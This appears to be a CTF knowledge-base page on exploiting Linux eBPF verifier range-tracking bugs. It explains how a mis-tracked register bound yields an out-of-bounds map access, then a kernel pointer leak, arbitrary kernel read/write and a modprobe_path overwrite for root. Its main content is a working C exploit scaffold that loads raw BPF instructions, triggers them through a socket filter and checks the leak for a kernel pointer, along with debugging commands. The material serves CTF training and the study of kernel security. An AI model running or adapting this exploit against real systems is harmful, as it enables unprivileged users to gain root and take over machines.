---
title: "eBPF Verifier Bugs - The Bug Shape and the Standard Read/Write Primitive"
category: pwn
subcategory: kernel
type: technique
tags: [kernel, ebpf, bpf, verifier, tnum, alu-sanitation, scalar-bounds, pointer-arithmetic, arbitrary-read, arbitrary-write, kaslr, modprobe-path, unprivileged-bpf-disabled, qemu, gdb, pwndbg]
difficulty: insane
summary: "The verifier tracks value ranges; when its tracking disagrees with reality by even one bit, you get an OOB map access and from there arbitrary kernel read/write."
when_to_use:
  - "The challenge patches `kernel/bpf/verifier.c` and gives you the diff"
  - "`/proc/sys/kernel/unprivileged_bpf_disabled` is 0"
  - "The bug lets you make the verifier believe a register's range is smaller than it is"
  - "You want a read/write primitive without touching the slab"
tools: [qemu, gdb, pwndbg, gcc, bpftool, llvm]
related: [kernel-mitigations, kernel-modprobe-path, kernel-slub-uaf-objects, kernel-setup-and-debug, kernel-pwn-cheatsheet]
---

## TL;DR

The eBPF verifier statically proves every memory access is in bounds by tracking each
register's possible value range (`umin/umax`, `smin/smax`, and a tnum of known bits).
A verifier bug is any case where the tracked range is *narrower* than the real one.
Then a `map_value + reg` access that the verifier proves safe is actually
out of bounds - and because BPF maps are kmalloc'd, an OOB write reaches the next
object. The standard end state is: leak a kernel pointer, overwrite one map's
`data` pointer with another map's, get arbitrary read/write, smash `modprobe_path`.

## Recognise it

- The challenge ships a kernel source tree with a small diff in
  `kernel/bpf/verifier.c` - that diff *is* the bug.
- `unprivileged_bpf_disabled` is 0 (check `/proc/sys/kernel/unprivileged_bpf_disabled`).
- The task is "write a BPF program that passes the verifier but does something else".
- Typical diff shapes: a removed `if (...) return -EACCES`, a `&` where there was a
  `|`, an `s32` where there was an `s64`, a missing `__reg_bound_offset()` call, or a
  disabled `sanitize_check_bounds`.

## Vulnerable code shape

The verifier's state per register:

```c
struct bpf_reg_state {
    enum bpf_reg_type type;
    s64 off;
    struct tnum var_off;    /* known bits: {value, mask} */
    s64 smin_value, smax_value;
    u64 umin_value, umax_value;
    s32 s32_min_value, s32_max_value;
    u32 u32_min_value, u32_max_value;
};
```

Two representative injected bugs:

```c
/* (a) kernel/bpf/verifier.c, adjust_scalar_min_max_vals(), BPF_AND case */
case BPF_AND:
    dst_reg->var_off = tnum_and(dst_reg->var_off, src_reg.var_off);
    /* BUG: __update_reg_bounds(dst_reg) removed, so the unsigned bounds and
       the tnum disagree - the verifier keeps a stale, too-narrow bound. */
    break;

/* (b) "scalar confusion": a runtime-variable value is marked as a constant */
if (BPF_SRC(insn->code) == BPF_K && insn->imm == 0)
    __mark_reg_known(dst_reg, 0);          /* BUG */
```

And the attacker's BPF program, in pseudo-assembly:

```
r0 = map_lookup_elem(map_a, key0)     ; r0 -> map_a value (a kmalloc'd buffer)
if r0 == 0 goto exit
r6 = *(u64 *)(r0 + 0)                 ; r6 = attacker-controlled, verifier says [0, U64_MAX]
r6 &= 0x1                             ; verifier now thinks r6 in [0, 1]
<trigger the bug so the verifier thinks r6 == 0 while it is really huge>
r0 += r6                              ; verifier: still inside the map value
*(u64 *)(r0 + 0) = r7                 ; OOB WRITE
```

## Theory

Targets: Linux 4.14+ (the verifier's range tracking in its modern form).

### What the verifier proves

For every access `*(size *)(reg + off)` with `reg` a `PTR_TO_MAP_VALUE`,
`check_map_access()` requires
`reg->off + off + reg->umax_value + size <= map->value_size` (plus a signed-bounds
check for negative offsets). So the only thing between you and an OOB access is the
accuracy of `umax_value` / `var_off.mask`.

Three sources of range knowledge that must stay consistent: the **tnum** (`var_off`,
a `{value, mask}` pair of known bits), the **unsigned** bounds, and the **signed**
bounds plus their 32-bit variants. After every ALU op the verifier runs
`__update_reg_bounds()`, `__reg_deduce_bounds()` and `__reg_bound_offset()` to re-sync
them. A bug is almost always "one of those was skipped, or updated with the wrong
operand".

### Speculative-execution hardening as a side effect

`sanitize_ptr_alu()` inserts a runtime `AND` mask (`alu_limit`) so that even if the
verifier is wrong, the pointer stays inside the map. CTF challenges usually disable it
too; if the diff does not touch it, check whether your OOB survives the mask.

### From OOB to arbitrary read/write

A BPF array map's values live in a `kmalloc`'d region inside `struct bpf_array`, whose
first member is a `struct bpf_map` (and `bpf_map.ops` is a kernel `.text` pointer).
Standard escalation:

1. Create **two** array maps of the same value size so they land adjacent in the slab
   (spray several and find a pair).
2. Use the OOB **read** first to leak a kernel pointer out of an adjacent object -
   a `bpf_map`'s `ops` is a kernel `.text` pointer, so KASLR falls immediately.
3. Then use the OOB write to overwrite the second map's value *pointer* with an
   arbitrary address.
4. `bpf(BPF_MAP_LOOKUP_ELEM)` now reads that address and `BPF_MAP_UPDATE_ELEM` writes
   it: **arbitrary read/write** driven entirely from userland.
5. `modprobe_path = "/tmp/x"` and you are done (see `kernel-modprobe-path`).

A simpler variant many CTFs use: the OOB reaches a sprayed object of a type you
control entirely, and you pivot through that.

### Writing the program

Emit raw `struct bpf_insn` arrays from C and call `bpf(BPF_PROG_LOAD, ...)` directly -
far easier to control than compiling restricted C with clang, and what real exploits
do. Attach to a socket filter (`setsockopt(SO_ATTACH_BPF)` on a socketpair) and
trigger with a one-byte `write()`; `BPF_PROG_TYPE_SOCKET_FILTER` needs no privileges.

## Attack

1. Read the diff. Identify exactly which register field is mis-tracked and under what
   operation.
2. Build a BPF program that:
   - loads a runtime-variable value (from a map, so the verifier calls it unknown),
   - narrows the verifier's belief using the buggy operation,
   - adds it to a `PTR_TO_MAP_VALUE`,
   - reads/writes through it.
3. Verify the program loads: `bpf(BPF_PROG_LOAD)` returning a fd means the verifier
   accepted it. `EACCES` plus the log tells you which check you still trip
   (always pass a big `log_buf`).
4. Attach to a socketpair with `SO_ATTACH_BPF` and trigger with a 1-byte `write`.
5. Read the result out of a second map with `bpf(BPF_MAP_LOOKUP_ELEM)`.
6. Leak first (find a `0xffffffff8...` value), compute `kbase`.
7. Turn the OOB into arbitrary R/W, then write `modprobe_path`.

## Heap state

```text
verifier state vs reality

  instruction            verifier thinks          actually
  ---------------------  -----------------------  ----------------------
  r6 = *(u64*)(r0+0)     umin=0 umax=U64_MAX      attacker controlled
  r6 &= 0xffffffff       umin=0 umax=0xffffffff   same
  <buggy op>             umin=0 umax=0            still 0xffffffff
  r0 += r6               ptr + [0,0]  -> "safe"   ptr + 0xffffffff
  *(u64*)(r0+0) = r7     in-bounds store          OOB WRITE

slab layout after spraying array maps

  kmalloc-1024:
    [ map A values (0x400) ][ map B values (0x400) ][ ... ]
      ^ r0 points here        ^ OOB write lands here

  nearby, in a smaller cache:
    [ struct bpf_array for A ]
        +0x00 struct bpf_map
              +0x00 ops -> &array_map_ops     <- KERNEL TEXT LEAK
              +0x1c value_size
              +0x20 max_entries

final primitive

  overwrite a map's value pointer with TARGET, then from userland
    bpf(BPF_MAP_LOOKUP_ELEM, {map_fd=B, key=&0, value=&out})  -> read *TARGET
    bpf(BPF_MAP_UPDATE_ELEM, {map_fd=B, key=&0, value=&in})   -> write *TARGET

  TARGET = modprobe_path ; write "/tmp/x\0" ; execve a bad-magic file ; root
```

## Exploit

```c
/* ebpf.c - scaffolding for an eBPF verifier-bug exploit.
 * Build: gcc -static -O2 -o exp ebpf.c
 *
 * This contains the parts that are the SAME for every verifier bug:
 * raw instruction emission, map creation, program load with a verifier log,
 * socket-filter attach, and the map read/write helpers. The bug-specific
 * sequence goes in build_prog().
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define LOG_SIZE 0x10000
#define VALUE_SIZE 0x400

static char verifier_log[LOG_SIZE];

/* ---- raw instruction helpers (subset of the kernel's samples/bpf) ---- */
#define INSN(c, d, s, o, i) \
    ((struct bpf_insn){ .code = (c), .dst_reg = (d), .src_reg = (s), \
                        .off = (o), .imm = (i) })

#define MOV64_IMM(D, I)     INSN(BPF_ALU64 | BPF_MOV | BPF_K, D, 0, 0, I)
#define MOV64_REG(D, S)     INSN(BPF_ALU64 | BPF_MOV | BPF_X, D, S, 0, 0)
#define ALU64_IMM(OP, D, I) INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, D, 0, 0, I)
#define ALU64_REG(OP, D, S) INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, D, S, 0, 0)
#define LDX_MEM(SZ, D, S, O) INSN(BPF_LDX | BPF_SIZE(SZ) | BPF_MEM, D, S, O, 0)
#define STX_MEM(SZ, D, S, O) INSN(BPF_STX | BPF_SIZE(SZ) | BPF_MEM, D, S, O, 0)
#define ST_MEM(SZ, D, O, I)  INSN(BPF_ST | BPF_SIZE(SZ) | BPF_MEM, D, 0, O, I)
#define JMP_IMM(OP, D, I, O) INSN(BPF_JMP | BPF_OP(OP) | BPF_K, D, 0, O, I)
#define EMIT_CALL(FN)       INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FN)
#define EXIT()              INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

/* BPF_LD_IMM64 is a TWO-instruction encoding; emit it through a helper so the
 * instruction count stays honest (miscounting it breaks every jump offset). */
static unsigned emit_ld_map_fd(struct bpf_insn *p, unsigned n, int dst, int map_fd)
{
    p[n++] = INSN(BPF_LD | BPF_DW | BPF_IMM, dst, BPF_PSEUDO_MAP_FD, 0, map_fd);
    p[n++] = INSN(0, 0, 0, 0, 0);
    return n;
}

static void die(const char *m)
{
    perror(m);
    exit(1);
}

static int bpf(int cmd, union bpf_attr *attr)
{
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static int map_create(unsigned value_size, unsigned max_entries)
{
    union bpf_attr attr;
    int fd;

    memset(&attr, 0, sizeof attr);
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = value_size;
    attr.max_entries = max_entries;

    fd = bpf(BPF_MAP_CREATE, &attr);
    if (fd < 0)
        die("BPF_MAP_CREATE");
    return fd;
}

static int map_read(int fd, unsigned key, void *out)
{
    union bpf_attr attr;

    memset(&attr, 0, sizeof attr);
    attr.map_fd = fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)out;
    return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

static int map_write(int fd, unsigned key, const void *in)
{
    union bpf_attr attr;

    memset(&attr, 0, sizeof attr);
    attr.map_fd = fd;
    attr.key = (unsigned long)&key;
    attr.value = (unsigned long)in;
    attr.flags = BPF_ANY;
    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

static int prog_load(const struct bpf_insn *insns, unsigned n)
{
    union bpf_attr attr;
    int fd;

    memset(&attr, 0, sizeof attr);
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insn_cnt = n;
    attr.insns = (unsigned long)insns;
    attr.license = (unsigned long)"GPL";
    attr.log_level = 2;
    attr.log_size = LOG_SIZE;
    attr.log_buf = (unsigned long)verifier_log;

    fd = bpf(BPF_PROG_LOAD, &attr);
    if (fd < 0) {
        fprintf(stderr, "[-] BPF_PROG_LOAD failed: %s\n", strerror(errno));
        fputs(verifier_log, stderr);
    }
    return fd;
}

/* Attach to a socketpair and fire the program with a one-byte write. */
static void run_prog(int prog_fd)
{
    int sv[2];
    char one = 'x';

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0)
        die("socketpair");
    if (setsockopt(sv[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof prog_fd) < 0)
        die("SO_ATTACH_BPF");
    if (write(sv[0], &one, 1) != 1)
        die("write(trigger)");
    close(sv[0]);
    close(sv[1]);
}

/* ---------------------------------------------------------------------
 * The bug-specific part. Replace the marked block with the instruction
 * sequence that makes the verifier mis-track a register on YOUR kernel.
 * --------------------------------------------------------------------- */
static unsigned build_prog(struct bpf_insn *p, int ctrl_fd, int out_fd)
{
    unsigned n = 0;

    /* r9 = &ctrl_map[0] : holds the attacker-controlled offset */
    n = emit_ld_map_fd(p, n, BPF_REG_1, ctrl_fd);
    p[n++] = MOV64_REG(BPF_REG_2, BPF_REG_10);
    p[n++] = ALU64_IMM(BPF_ADD, BPF_REG_2, -4);
    p[n++] = ST_MEM(BPF_W, BPF_REG_10, -4, 0);
    p[n++] = EMIT_CALL(BPF_FUNC_map_lookup_elem);
    p[n++] = JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 20);   /* bail if NULL */
    p[n++] = MOV64_REG(BPF_REG_9, BPF_REG_0);

    /* r6 = ctrl[0] : unknown to the verifier, chosen by us at runtime */
    p[n++] = LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0);

    /* ===================== BUG-SPECIFIC BLOCK ======================= *
     * Narrow the verifier's belief about r6 without narrowing reality.
     * Example placeholder for a "BPF_AND forgets to update umax" bug:
     *     r6 &= 0xffffffff   -> verifier: [0, 0xffffffff], real: same
     *     <buggy op>         -> verifier: [0, 0],         real: huge
     * Put the real sequence here once you have read the diff.
     */
    p[n++] = ALU64_IMM(BPF_AND, BPF_REG_6, -1);
    /* ================================================================ */

    /* r7 = &out_map[0] */
    n = emit_ld_map_fd(p, n, BPF_REG_1, out_fd);
    p[n++] = MOV64_REG(BPF_REG_2, BPF_REG_10);
    p[n++] = ALU64_IMM(BPF_ADD, BPF_REG_2, -4);
    p[n++] = ST_MEM(BPF_W, BPF_REG_10, -4, 0);
    p[n++] = EMIT_CALL(BPF_FUNC_map_lookup_elem);
    p[n++] = JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 6);
    p[n++] = MOV64_REG(BPF_REG_7, BPF_REG_0);

    /* the OOB access: r7 += r6 (verifier thinks r6 == 0) */
    p[n++] = ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_6);
    p[n++] = LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0);   /* OOB READ  */
    p[n++] = STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_8, 8);   /* stash it  */

    p[n++] = MOV64_IMM(BPF_REG_0, 0);
    p[n++] = EXIT();
    return n;
}

int main(void)
{
    struct bpf_insn prog[256];
    unsigned char ctrl[VALUE_SIZE];
    unsigned long *slot = (unsigned long *)ctrl;
    int ctrl_fd, out_fd, prog_fd;
    unsigned n;

    ctrl_fd = map_create(VALUE_SIZE, 1);
    out_fd = map_create(VALUE_SIZE, 1);
    printf("[+] maps: ctrl=%d out=%d\n", ctrl_fd, out_fd);

    memset(ctrl, 0, sizeof ctrl);
    slot[0] = 0x400;               /* the OOB offset we want at runtime */
    if (map_write(ctrl_fd, 0, ctrl) < 0)
        die("BPF_MAP_UPDATE_ELEM");

    n = build_prog(prog, ctrl_fd, out_fd);
    printf("[*] program is %u instructions\n", n);

    prog_fd = prog_load(prog, n);
    if (prog_fd < 0) {
        puts("[-] the verifier rejected it: read the log above and adjust "
             "build_prog() to match the injected bug");
        return 1;
    }
    puts("[+] verifier accepted the program");

    run_prog(prog_fd);

    memset(ctrl, 0, sizeof ctrl);
    if (map_read(ctrl_fd, 0, ctrl) < 0)
        die("BPF_MAP_LOOKUP_ELEM");
    printf("[+] OOB read value = %#lx\n", slot[1]);
    if ((slot[1] >> 40) == 0xFFFFFF)
        printf("[+] that is a kernel pointer - KASLR is done\n");
    else
        puts("[-] not a kernel pointer: adjust the offset or the spray");

    return 0;
}
```

## Variants & pitfalls

- **`unprivileged_bpf_disabled`.** If it is 1 or 2, `bpf()` returns `EPERM` and the
  whole category is closed. Check first.
- **Always pass a log buffer.** `log_level = 2` plus a 64 KB `log_buf` prints the
  verifier's per-instruction register state - that is how you see whether your
  narrowing worked (`R6=inv0` vs `R6=inv(umax=...)`).
- **`sanitize_ptr_alu` / `alu_limit`.** Even with a verifier bug, the Spectre
  hardening may clamp your pointer at runtime. If the program loads but the OOB does
  not happen, look for this.
- **Instruction limits.** 4096 for unprivileged; the branch-complexity limit bites
  earlier.
- **`BPF_LD_IMM64` (the map-fd load) is two instructions.** Getting the count wrong
  shifts every jump offset - the #1 source of `jump out of range`. The helper above
  keeps the count honest.
- **Leak before write.** A bad write panics; a bad read usually returns garbage.
- **End on `modprobe_path`.** Once you have arbitrary R/W, do not build a ROP chain -
  write the string and trigger `request_module`.

## Debugging

```text
pwndbg> b bpf_check                     # the verifier entry point
pwndbg> b check_map_access
pwndbg> p *reg
pwndbg> p reg->umax_value
pwndbg> p/x reg->var_off
pwndbg> b array_map_lookup_elem
pwndbg> p *(struct bpf_array *)$rdi
pwndbg> p ((struct bpf_map*)$rdi)->value_size
pwndbg> p &array_map_ops
```

```bash
# Can we even use bpf() unprivileged?
cat /proc/sys/kernel/unprivileged_bpf_disabled
# Read the verifier's reasoning (this is the main debugging tool):
#   set log_level=2 and dump log_buf on EACCES - the exploit above already does.
# Inspect loaded programs/maps (needs root, development only):
bpftool prog show
bpftool map show
```

## Tools

- No toolchain needed: emit `struct bpf_insn` from C.
- `bpftool` for inspection during development.
- The verifier log itself - it is more informative than any debugger.

## References

- Linux `kernel/bpf/verifier.c` (`adjust_scalar_min_max_vals`, `check_map_access`,
  `sanitize_ptr_alu`, `__update_reg_bounds`, `__reg_deduce_bounds`).
- Linux `include/linux/tnum.h` for the tnum arithmetic.
- `samples/bpf/bpf_insn.h` in the kernel tree for the instruction macros.
